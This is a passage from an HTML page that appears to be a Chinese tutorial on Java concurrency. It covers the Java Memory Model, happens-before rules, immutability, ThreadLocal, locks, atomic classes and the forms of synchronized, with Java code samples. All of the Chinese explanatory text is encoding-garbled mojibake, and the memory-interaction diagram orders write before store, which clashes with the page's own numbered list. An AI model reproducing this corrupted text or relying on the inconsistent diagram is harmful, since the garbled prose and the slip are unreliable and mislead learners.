<li>ä½¿ç”¨volatileç¦æ­¢é‡æ’åº</li>
<li>ä½¿ç”¨synchronizedä¿è¯æœ‰åºæ€§</li>
<li>éµå¾ªhappens-beforeè§„åˆ™</li>
</ul>
<h3 data-id="heading-39">2.2 å†…å­˜æ¨¡å‹åŸºç¡€</h3>
<h4 data-id="heading-40">JMMï¼ˆJava Memory Modelï¼‰æ¦‚è¿°</h4>
<p>**Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰**å®šä¹‰äº†Javaç¨‹åºä¸­å„ç§å˜é‡ï¼ˆå®ä¾‹å˜é‡ã€é™æ€å˜é‡ç­‰ï¼‰çš„è®¿é—®è§„åˆ™ï¼Œä»¥åŠåœ¨JVMä¸­å°†å˜é‡å­˜å‚¨åˆ°å†…å­˜å’Œä»å†…å­˜ä¸­è¯»å–å˜é‡çš„åº•å±‚ç»†èŠ‚ã€‚</p>
<p><strong>JMMçš„ç›®æ ‡ï¼š</strong></p>
<ul>
<li>å±è”½å„ç§ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜è®¿é—®å·®å¼‚</li>
<li>ä¿è¯Javaç¨‹åºåœ¨å„ç§å¹³å°ä¸‹éƒ½èƒ½è¾¾åˆ°ä¸€è‡´çš„å†…å­˜è®¿é—®æ•ˆæœ</li>
<li>ä¸ºå¤šçº¿ç¨‹ç¼–ç¨‹æä¾›å†…å­˜å¯è§æ€§ä¿è¯</li>
</ul>
<h4 data-id="heading-41">ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜</h4>
<p><strong>ä¸»å†…å­˜ï¼ˆMain Memoryï¼‰ï¼š</strong></p>
<ul>
<li>æ‰€æœ‰å…±äº«å˜é‡éƒ½å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­</li>
<li>ä¸»å†…å­˜æ˜¯å…±äº«çš„ï¼Œæ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®</li>
</ul>
<p><strong>å·¥ä½œå†…å­˜ï¼ˆWorking Memoryï¼‰ï¼š</strong></p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜</li>
<li>å·¥ä½œå†…å­˜ä¿å­˜äº†è¯¥çº¿ç¨‹ä½¿ç”¨åˆ°çš„å˜é‡çš„ä¸»å†…å­˜å‰¯æœ¬</li>
<li>çº¿ç¨‹å¯¹å˜é‡çš„æ‰€æœ‰æ“ä½œéƒ½å¿…é¡»åœ¨å·¥ä½œå†…å­˜ä¸­è¿›è¡Œ</li>
<li>ä¸åŒçº¿ç¨‹ä¹‹é—´æ— æ³•ç›´æ¥è®¿é—®å¯¹æ–¹çš„å·¥ä½œå†…å­˜</li>
</ul>
<p><strong>å†…å­˜äº¤äº’æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">ä¸»å†…å­˜
  â†“ read
å·¥ä½œå†…å­˜ï¼ˆçº¿ç¨‹<span class="hljs-number">1</span>ï¼‰ â†â†’ å·¥ä½œå†…å­˜ï¼ˆçº¿ç¨‹<span class="hljs-number">2</span>ï¼‰
  â†“ assign          â†“ assign
  â†“ write           â†“ write
  â†“ store           â†“ store
ä¸»å†…å­˜
</code></pre>
<p><strong>8ç§å†…å­˜æ“ä½œï¼š</strong></p>
<ol>
<li><code>lock</code>ï¼ˆé”å®šï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼ŒæŠŠå˜é‡æ ‡è¯†ä¸ºçº¿ç¨‹ç‹¬å </li>
<li><code>unlock</code>ï¼ˆè§£é”ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼Œé‡Šæ”¾é”å®šçŠ¶æ€çš„å˜é‡</li>
<li><code>read</code>ï¼ˆè¯»å–ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼ŒæŠŠå˜é‡å€¼ä»ä¸»å†…å­˜ä¼ è¾“åˆ°çº¿ç¨‹å·¥ä½œå†…å­˜</li>
<li><code>load</code>ï¼ˆè½½å…¥ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠreadå¾—åˆ°çš„å€¼æ”¾å…¥å·¥ä½œå†…å­˜çš„å˜é‡å‰¯æœ¬</li>
<li><code>use</code>ï¼ˆä½¿ç”¨ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠå·¥ä½œå†…å­˜å˜é‡å€¼ä¼ é€’ç»™æ‰§è¡Œå¼•æ“</li>
<li><code>assign</code>ï¼ˆèµ‹å€¼ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠæ‰§è¡Œå¼•æ“æ¥æ”¶çš„å€¼èµ‹ç»™å·¥ä½œå†…å­˜å˜é‡</li>
<li><code>store</code>ï¼ˆå­˜å‚¨ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠå·¥ä½œå†…å­˜å˜é‡å€¼ä¼ é€åˆ°ä¸»å†…å­˜</li>
<li><code>write</code>ï¼ˆå†™å…¥ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼ŒæŠŠstoreä¼ é€æ¥çš„å€¼æ”¾å…¥ä¸»å†…å­˜å˜é‡</li>
</ol>
<h4 data-id="heading-42">å†…å­˜å¯è§æ€§</h4>
<p><strong>å†…å­˜å¯è§æ€§</strong>æ˜¯æŒ‡å½“ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†å…±äº«å˜é‡çš„å€¼ï¼Œå…¶ä»–çº¿ç¨‹èƒ½å¤Ÿç«‹å³çœ‹åˆ°è¿™ä¸ªä¿®æ”¹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryVisibility</span> {
    <span class="hljs-comment">// æ²¡æœ‰volatileï¼Œå¯èƒ½ä¸å¯è§</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        count = <span class="hljs-number">1</span>;      <span class="hljs-comment">// æ­¥éª¤1</span>
        flag = <span class="hljs-literal">true</span>;    <span class="hljs-comment">// æ­¥éª¤2</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (flag) {     <span class="hljs-comment">// æ­¥éª¤3</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> count; <span class="hljs-comment">// æ­¥éª¤4ï¼Œå¯èƒ½è¯»åˆ°0</span>
        }
    }
}
</code></pre>
<p><strong>å¯è§æ€§é—®é¢˜äº§ç”Ÿçš„åŸå› ï¼š</strong></p>
<ol>
<li><strong>CPUç¼“å­˜</strong>ï¼šæ¯ä¸ªCPUæ ¸å¿ƒæœ‰è‡ªå·±çš„ç¼“å­˜ï¼Œå˜é‡å¯èƒ½åªæ›´æ–°åœ¨ç¼“å­˜ä¸­</li>
<li><strong>æŒ‡ä»¤é‡æ’åº</strong>ï¼šç¼–è¯‘å™¨å’ŒCPUå¯èƒ½é‡æ’åºæŒ‡ä»¤</li>
<li><strong>å¯„å­˜å™¨ä¼˜åŒ–</strong>ï¼šå˜é‡å¯èƒ½è¢«ä¼˜åŒ–åˆ°å¯„å­˜å™¨ä¸­</li>
</ol>
<p><strong>ä¿è¯å¯è§æ€§çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>volatile</code>å…³é”®å­—</li>
<li><code>synchronized</code>å…³é”®å­—</li>
<li><code>final</code>å…³é”®å­—ï¼ˆåˆå§‹åŒ–åå¯è§ï¼‰</li>
<li><code>Lock</code>æ¥å£</li>
</ul>
<h4 data-id="heading-43">happens-beforeè§„åˆ™</h4>
<p><strong>happens-before</strong>æ˜¯JMMçš„æ ¸å¿ƒæ¦‚å¿µï¼Œç”¨äºæè¿°ä¸¤ä¸ªæ“ä½œä¹‹é—´çš„å¯è§æ€§å…³ç³»ã€‚</p>
<p><strong>è§„åˆ™1ï¼šç¨‹åºé¡ºåºè§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ“ä½œ1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;  <span class="hljs-comment">// æ“ä½œ2</span>
<span class="hljs-comment">// æ“ä½œ1 happens-before æ“ä½œ2</span>
</code></pre>
<p><strong>è§„åˆ™2ï¼švolatileè§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-comment">// çº¿ç¨‹1</span>
x = <span class="hljs-number">1</span>; <span class="hljs-comment">// å†™æ“ä½œ</span>

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> x; <span class="hljs-comment">// è¯»æ“ä½œï¼Œèƒ½çœ‹åˆ°x=1</span>
</code></pre>
<p><strong>è§„åˆ™3ï¼šä¼ é€’æ€§è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¦‚æœ A happens-before Bï¼ŒB happens-before C</span>
<span class="hljs-comment">// é‚£ä¹ˆ A happens-before C</span>
</code></pre>
<p><strong>è§„åˆ™4ï¼šç›‘è§†å™¨é”è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-comment">// è§£é” happens-before åç»­çš„åŠ é”</span>
}
</code></pre>
<p><strong>è§„åˆ™5ï¼šstart()è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// çº¿ç¨‹tä¸­çš„æ“ä½œ</span>
});
t.start(); <span class="hljs-comment">// start() happens-before çº¿ç¨‹tä¸­çš„ä»»ä½•æ“ä½œ</span>
</code></pre>
<p><strong>è§„åˆ™6ï¼šjoin()è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// çº¿ç¨‹tä¸­çš„æ“ä½œ</span>
});
t.start();
t.join(); <span class="hljs-comment">// çº¿ç¨‹tä¸­çš„æ‰€æœ‰æ“ä½œ happens-before join()è¿”å›</span>
</code></pre>
<p><strong>è§„åˆ™7ï¼šçº¿ç¨‹ä¸­æ–­è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java">thread.interrupt(); <span class="hljs-comment">// happens-before æ£€æµ‹åˆ°ä¸­æ–­</span>
</code></pre>
<p><strong>è§„åˆ™8ï¼šå¯¹è±¡ç»ˆç»“è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯¹è±¡çš„æ„é€ å‡½æ•° happens-before finalize()æ–¹æ³•</span>
</code></pre>
<h4 data-id="heading-44">as-if-serialè¯­ä¹‰</h4>
<p><strong>as-if-serialè¯­ä¹‰</strong>æ˜¯æŒ‡ï¼šä¸ç®¡æ€ä¹ˆé‡æ’åºï¼Œå•çº¿ç¨‹ç¨‹åºçš„æ‰§è¡Œç»“æœä¸èƒ½è¢«æ”¹å˜ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">// 1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;      <span class="hljs-comment">// 2</span>
<span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;  <span class="hljs-comment">// 3ï¼Œä¾èµ–aå’Œb</span>

<span class="hljs-comment">// å¯ä»¥é‡æ’åº1å’Œ2ï¼Œä½†ä¸èƒ½é‡æ’åº3åˆ°1æˆ–2ä¹‹å‰</span>
</code></pre>
<p><strong>å•çº¿ç¨‹ vs å¤šçº¿ç¨‹ï¼š</strong></p>
<ul>
<li><strong>å•çº¿ç¨‹</strong>ï¼šas-if-serialä¿è¯ç»“æœæ­£ç¡®</li>
<li><strong>å¤šçº¿ç¨‹</strong>ï¼šéœ€è¦happens-beforeä¿è¯å¯è§æ€§</li>
</ul>
<h3 data-id="heading-45">2.3 çº¿ç¨‹å®‰å…¨çš„å®ç°æ–¹å¼</h3>
<h4 data-id="heading-46">ä¸å¯å˜å¯¹è±¡</h4>
<p>**ä¸å¯å˜å¯¹è±¡ï¼ˆImmutable Objectï¼‰**æ˜¯æŒ‡å¯¹è±¡åˆ›å»ºåçŠ¶æ€ä¸èƒ½è¢«ä¿®æ”¹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¯å˜ç±»ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImmutablePoint</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> x;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> y;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ImmutablePoint</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> {
        <span class="hljs-built_in">this</span>.x = x;
        <span class="hljs-built_in">this</span>.y = y;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getX</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> x;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getY</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> y;
    }
    
    <span class="hljs-comment">// æ²¡æœ‰setteræ–¹æ³•ï¼ŒçŠ¶æ€ä¸å¯å˜</span>
}
</code></pre>
<p><strong>å®ç°ä¸å¯å˜å¯¹è±¡çš„åŸåˆ™ï¼š</strong></p>
<ol>
<li>æ‰€æœ‰å­—æ®µéƒ½æ˜¯<code>final</code>çš„</li>
<li>ç±»å£°æ˜ä¸º<code>final</code>ï¼Œé˜²æ­¢è¢«ç»§æ‰¿</li>
<li>ä¸æä¾›ä¿®æ”¹çŠ¶æ€çš„æ–¹æ³•</li>
<li>å¦‚æœå­—æ®µæ˜¯å¼•ç”¨ç±»å‹ï¼Œç¡®ä¿å¼•ç”¨çš„å¯¹è±¡ä¹Ÿæ˜¯ä¸å¯å˜çš„</li>
</ol>
<p><strong>Javaä¸­çš„ä¸å¯å˜ç±»ï¼š</strong></p>
<ul>
<li><code>String</code></li>
<li><code>Integer</code>ã€<code>Long</code>ç­‰åŒ…è£…ç±»</li>
<li><code>BigInteger</code>ã€<code>BigDecimal</code></li>
</ul>
<h4 data-id="heading-47">çº¿ç¨‹å°é—­</h4>
<p>**çº¿ç¨‹å°é—­ï¼ˆThread Confinementï¼‰**æ˜¯æŒ‡å°†å¯¹è±¡é™åˆ¶åœ¨å•ä¸ªçº¿ç¨‹ä¸­ï¼Œé¿å…å…±äº«ã€‚</p>
<p><strong>æ–¹å¼1ï¼šæ ˆå°é—­</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">localVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œçº¿ç¨‹å®‰å…¨</span>
    localVar++;
}
</code></pre>
<p><strong>æ–¹å¼2ï¼šThreadLocal</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadLocalExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;Integer&gt; threadLocal = 
        ThreadLocal.withInitial(() -&gt; <span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        threadLocal.set(threadLocal.get() + <span class="hljs-number">1</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> threadLocal.get();
    }
}
</code></pre>
<h4 data-id="heading-48">åŒæ­¥æœºåˆ¶</h4>
<p><strong>æ–¹å¼1ï¼šsynchronized</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizedExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;
    }
}
</code></pre>
<p><strong>æ–¹å¼2ï¼šLock</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            count++;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<p><strong>æ–¹å¼3ï¼šåŸå­ç±»</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count.incrementAndGet();
    }
}
</code></pre>
<h4 data-id="heading-49">æ— é”ç¼–ç¨‹</h4>
<p>**æ— é”ç¼–ç¨‹ï¼ˆLock-Free Programmingï¼‰**ä½¿ç”¨CASæ“ä½œå®ç°çº¿ç¨‹å®‰å…¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockFreeExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> current;
        <span class="hljs-type">int</span> next;
        <span class="hljs-keyword">do</span> {
            current = count.get();
            next = current + <span class="hljs-number">1</span>;
        } <span class="hljs-keyword">while</span> (!count.compareAndSet(current, next));
    }
}
</code></pre>
<p><strong>æ— é”ç¼–ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>é¿å…é”ç«äº‰</li>
<li>é¿å…æ­»é”</li>
<li>æ€§èƒ½æ›´å¥½ï¼ˆåœ¨ä½ç«äº‰æƒ…å†µä¸‹ï¼‰</li>
</ul>
<p><strong>æ— é”ç¼–ç¨‹çš„æŒ‘æˆ˜ï¼š</strong></p>
<ul>
<li>ABAé—®é¢˜</li>
<li>è‡ªæ—‹å¼€é”€</li>
<li>å®ç°å¤æ‚</li>
</ul>
<h2 data-id="heading-50">ç¬¬ä¸‰ç«  synchronizedå…³é”®å­—</h2>
<h3 data-id="heading-51">3.1 synchronizedåŸºç¡€</h3>
<h4 data-id="heading-52">synchronizedçš„ä¸‰ç§ç”¨æ³•</h4>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>synchronizedæ˜¯Javaä¸­æœ€åŸºæœ¬çš„åŒæ­¥æœºåˆ¶</li>
<li>å¯ä»¥é”ä½ä»£ç å—ï¼Œä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æ‰§è¡Œ</li>
<li>å°±åƒç»™ä»£ç æ®µåŠ ä¸Š"é—¨é”"ï¼Œä¸€æ¬¡åªå…è®¸ä¸€ä¸ªäººè¿›å…¥</li>
</ul>
<h5 data-id="heading-53">1. ä¿®é¥°å®ä¾‹æ–¹æ³•</h5>
<p><strong>ç”¨æ³•ï¼š</strong> åœ¨æ–¹æ³•å£°æ˜å‰åŠ ä¸Š<code>synchronized</code>å…³é”®å­—</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// é”çš„æ˜¯å½“å‰å®ä¾‹å¯¹è±¡ï¼ˆthisï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;
    }
    
    <span class="hljs-comment">// ç­‰ä»·äºï¼š</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {  <span class="hljs-comment">// ç­‰ä»·å†™æ³•</span>
            count++;
        }
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>é”å¯¹è±¡</strong>ï¼šå½“å‰å®ä¾‹å¯¹è±¡ï¼ˆthisï¼‰</li>
<li><strong>ä½œç”¨èŒƒå›´</strong>ï¼šæ•´ä¸ªæ–¹æ³•</li>
<li><strong>äº’æ–¥å…³ç³»</strong>ï¼š
<ul>
<li>âœ… åŒä¸€ä¸ªå®ä¾‹çš„å¤šä¸ªçº¿ç¨‹ä¼šäº’æ–¥</li>
<li>âŒ ä¸åŒå®ä¾‹ä¹‹é—´ä¸äº’æ–¥ï¼ˆå„è‡ªç‹¬ç«‹ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>ç¤ºä¾‹ç†è§£ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Counter</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-type">Counter</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();

<span class="hljs-comment">// çº¿ç¨‹1å’Œçº¿ç¨‹2ä¼šäº’æ–¥ï¼ˆåŒä¸€ä¸ªå®ä¾‹ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c1.increment()).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c1.increment()).start();

<span class="hljs-comment">// çº¿ç¨‹3ä¸ä¼šä¸çº¿ç¨‹1ã€2äº’æ–¥ï¼ˆä¸åŒå®ä¾‹ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c2.increment()).start();
</code></pre>
<h5 data-id="heading-54">2. ä¿®é¥°é™æ€æ–¹æ³•</h5>
<p><strong>ç”¨æ³•ï¼š</strong> åœ¨é™æ€æ–¹æ³•å‰åŠ ä¸Š<code>synchronized</code>å…³é”®å­—</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// é”çš„æ˜¯ç±»å¯¹è±¡ï¼ˆCounter.classï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;
    }
    
    <span class="hljs-comment">// ç­‰ä»·äºï¼š</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(Counter.class) {  <span class="hljs-comment">// ç­‰ä»·å†™æ³•</span>
            count++;
        }
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>é”å¯¹è±¡</strong>ï¼šç±»å¯¹è±¡ï¼ˆClasså¯¹è±¡ï¼‰ï¼Œå¦‚<code>Counter.class</code></li>
<li><strong>ä½œç”¨èŒƒå›´</strong>ï¼šæ•´ä¸ªé™æ€æ–¹æ³•</li>
<li><strong>äº’æ–¥å…³ç³»</strong>ï¼š
<ul>
<li>âœ… æ‰€æœ‰å®ä¾‹å…±äº«åŒä¸€æŠŠé”ï¼ˆå› ä¸ºClasså¯¹è±¡åªæœ‰ä¸€ä¸ªï¼‰</li>
<li>âœ… ä¸åŒå®ä¾‹çš„çº¿ç¨‹ä¹Ÿä¼šäº’æ–¥</li>
<li>âŒ é™æ€æ–¹æ³•å’Œå®ä¾‹æ–¹æ³•çš„é”ä¸åŒï¼Œä¸ä¼šäº’æ–¥</li>
</ul>
</li>
</ul>
<p><strong>ç¤ºä¾‹ç†è§£ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Counter</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-type">Counter</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();

<span class="hljs-comment">// çº¿ç¨‹1å’Œçº¿ç¨‹2ä¼šäº’æ–¥ï¼ˆé™æ€æ–¹æ³•ï¼Œå…±äº«ç±»é”ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; Counter.increment()).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; Counter.increment()).start();

<span class="hljs-comment">// å³ä½¿ä¸åŒå®ä¾‹ï¼Œä¹Ÿä¼šäº’æ–¥</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c1.increment()).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c2.increment()).start();
<span class="hljs-comment">// è¿™ä¸¤ä¸ªçº¿ç¨‹ä¼šäº’æ–¥ï¼Œå› ä¸ºå®ƒä»¬éƒ½ä½¿ç”¨Counter.classä½œä¸ºé”</span>
</code></pre>
<h5 data-id="heading-55">3. ä¿®é¥°ä»£ç å—</h5>
<p><strong>ç”¨æ³•ï¼š</strong> åœ¨ä»£ç å—å‰åŠ ä¸Š<code>synchronized(å¯¹è±¡)</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// ä¸“ç”¨é”å¯¹è±¡</span>
    
